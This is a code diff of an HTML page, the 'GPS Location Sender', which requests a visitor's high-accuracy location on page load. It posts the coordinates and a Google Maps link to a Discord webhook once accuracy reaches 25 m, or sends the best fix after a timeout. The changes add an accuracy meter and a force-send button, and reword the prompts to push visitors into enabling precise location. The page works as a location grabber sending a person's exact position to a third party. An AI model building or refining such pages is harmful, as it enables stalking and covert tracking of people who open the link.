@@ -45,7 +45,24 @@
         .error {
             color: #dc3545;
         }
-        #btn-allow {
+        #accuracy-meter {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 8px;
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            display: none;
+        }
+        .accuracy-val {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #007bff;
+        }
+        .accuracy-label {
+            font-size: 0.9rem;
+            color: #6c757d;
+        }
+        #btn-allow, #btn-force {
             display: none;
             margin-top: 1.5rem;
             padding: 0.8rem 2rem;
@@ -58,8 +75,14 @@
             cursor: pointer;
             transition: background-color 0.2s;
         }
+        #btn-force {
+            background-color: #28a745;
+        }
         #btn-allow:hover {
             background-color: #0056b3;
+        }
+        #btn-force:hover {
+            background-color: #218838;
         }
     </style>
 </head>
@@ -67,8 +90,17 @@
     <div class="container">
         <h1>GPS Location Sender</h1>
         <p>This page requests your GPS location and sends it to a Discord webhook.</p>
+        
+        <div id="accuracy-meter">
+            <div class="accuracy-label">Current Accuracy</div>
+            <div class="accuracy-val" id="current-acc">-- m</div>
+            <div class="accuracy-label" id="acc-msg">Finding GPS signal...</div>
+        </div>
+
         <div id="status" class="loading">Requesting location permission...</div>
+        
         <button id="btn-allow" onclick="getLocation()">Allow Location Access</button>
+        <button id="btn-force" onclick="forceSend()">Send Current Best Location</button>
     </div>
 
     <script>
@@ -79,14 +111,42 @@
 
         function updateStatus(message, className) {
             const statusDiv = document.getElementById('status');
-            const btn = document.getElementById('btn-allow');
+            const btnAllow = document.getElementById('btn-allow');
+            const btnForce = document.getElementById('btn-force');
+            const meter = document.getElementById('accuracy-meter');
+            
             statusDiv.textContent = message;
             statusDiv.className = className;
 
             if (className === 'error') {
-                btn.style.display = 'inline-block';
+                btnAllow.style.display = 'inline-block';
+                btnForce.style.display = 'none';
+                meter.style.display = 'none';
+            } else if (className === 'loading') {
+                btnAllow.style.display = 'none';
+                meter.style.display = 'block';
+                if (bestPosition) btnForce.style.display = 'inline-block';
             } else {
-                btn.style.display = 'none';
+                btnAllow.style.display = 'none';
+                btnForce.style.display = 'none';
+                meter.style.display = 'none';
+            }
+        }
+
+        function updateAccuracyUI(accuracy) {
+            const accVal = document.getElementById('current-acc');
+            const accMsg = document.getElementById('acc-msg');
+            accVal.textContent = `${accuracy.toFixed(1)} m`;
+            
+            if (accuracy <= 25) {
+                accVal.style.color = '#28a745';
+                accMsg.textContent = 'Perfect accuracy found! Sending...';
+            } else if (accuracy <= 100) {
+                accVal.style.color = '#ffc107';
+                accMsg.textContent = 'Good signal. Still refining...';
+            } else {
+                accVal.style.color = '#dc3545';
+                accMsg.textContent = 'Weak signal. Move to an open area.';
             }
         }
 
@@ -100,7 +160,7 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `🎯 **EXACT LOCATION FOUND**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
+                        content: `🎯 **EXACT LOCATION FOUND (GOOGLE MAPS STYLE)**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                     })
                 });
 
@@ -117,17 +177,27 @@
             }
         }
 
+        function forceSend() {
+            if (bestPosition) {
+                if (watchId) navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+                const { latitude, longitude, accuracy } = bestPosition.coords;
+                updateStatus(`Forcing send with ${accuracy.toFixed(1)}m accuracy...`, 'loading');
+                sendToDiscord(latitude, longitude, accuracy);
+            }
+        }
+
         function getLocation() {
             if (!navigator.geolocation) {
                 updateStatus('Geolocation is not supported by your browser.', 'error');
                 return;
             }
 
-            // Clear any existing watch
             if (watchId) navigator.geolocation.clearWatch(watchId);
             bestPosition = null;
+            document.getElementById('btn-force').style.display = 'none';
 
-            updateStatus('Waiting for GPS lock... (Accuracy must be < 30m)', 'loading');
+            updateStatus('Finding your exact spot... Please wait.', 'loading');
 
             const options = {
                 enableHighAccuracy: true,
@@ -138,18 +208,16 @@
             watchId = navigator.geolocation.watchPosition(
                 (position) => {
                     const { latitude, longitude, accuracy } = position.coords;
+                    updateAccuracyUI(accuracy);
                     
-                    // Keep track of the most accurate position found so far
                     if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                         bestPosition = position;
-                        updateStatus(`Refining... Current Accuracy: ${accuracy.toFixed(1)}m`, 'loading');
+                        document.getElementById('btn-force').style.display = 'inline-block';
                     }
 
-                    // If accuracy is good enough (less than 20 meters), stop watching and send
                     if (accuracy <= 25) {
                         navigator.geolocation.clearWatch(watchId);
                         watchId = null;
-                        updateStatus(`High accuracy found (${accuracy.toFixed(1)}m)! Sending...`, 'loading');
                         sendToDiscord(latitude, longitude, accuracy);
                     }
                 },
@@ -157,22 +225,17 @@
                     let errorMessage = 'An unknown error occurred.';
                     switch (error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = 'User denied or browser blocked the request. Please click the button below to allow manually.';
+                            errorMessage = 'Please enable "Precise Location" in your browser settings and try again.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = 'Location information is unavailable. Make sure your GPS is ON and you are not in a basement/elevator.';
+                            errorMessage = 'GPS signal not found. Are you indoors?';
                             break;
                         case error.TIMEOUT:
-                            // If we timed out but have a position (even if not < 20m), send the best one we found
                             if (bestPosition) {
-                                navigator.geolocation.clearWatch(watchId);
-                                watchId = null;
-                                const { latitude, longitude, accuracy } = bestPosition.coords;
-                                updateStatus(`Timeout. Sending best found (${accuracy.toFixed(1)}m)...`, 'loading');
-                                sendToDiscord(latitude, longitude, accuracy);
+                                forceSend();
                                 return;
                             }
-                            errorMessage = 'The request timed out. Please try again with a better signal.';
+                            errorMessage = 'Signal search timed out. Move to a better spot.';
                             break;
                     }
                     updateStatus(errorMessage, 'error');
@@ -180,19 +243,14 @@
                 options
             );
 
-            // Safety timeout: if after 20 seconds we still don't have < 25m, send the best we have
+            // If we don't get a perfect lock in 25s, send the best we have
             setTimeout(() => {
                 if (watchId && bestPosition) {
-                    navigator.geolocation.clearWatch(watchId);
-                    watchId = null;
-                    const { latitude, longitude, accuracy } = bestPosition.coords;
-                    updateStatus(`Sending best available accuracy (${accuracy.toFixed(1)}m)...`, 'loading');
-                    sendToDiscord(latitude, longitude, accuracy);
+                    forceSend();
                 }
-            }, 20000);
+            }, 25000);
         }
 
-        // Run on load
         window.onload = getLocation;
     </script>
 </body>
